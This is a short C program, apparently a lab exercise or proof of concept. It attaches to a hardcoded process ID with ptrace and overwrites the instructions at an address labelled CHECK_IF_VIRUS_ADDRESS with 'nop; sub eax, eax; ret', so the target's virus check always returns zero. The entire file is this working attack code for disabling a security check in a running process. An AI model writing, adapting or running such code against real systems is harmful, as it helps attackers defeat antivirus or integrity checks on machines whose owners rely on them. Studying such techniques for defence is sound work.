#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int pid = 0x12345678;
#define CHECK_IF_VIRUS_ADDRESS 0xb7fd3750
#define MY_CODE 0xc3c02990 //nop; sub eax, eax; ret

int main() 
{
	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
	{
		perror("attach");
		return -1;
	}

	int status;
	waitpid(pid, &status, 0);
	if(WIFEXITED(status)) {return -1;}
	ptrace(PTRACE_POKETEXT, pid, CHECK_IF_VIRUS_ADDRESS, MY_CODE);



	if(ptrace(PTRACE_DETACH, pid, NULL, NULL))
	{
		perror("detach");
		return -1;
	}
    return 0;
}
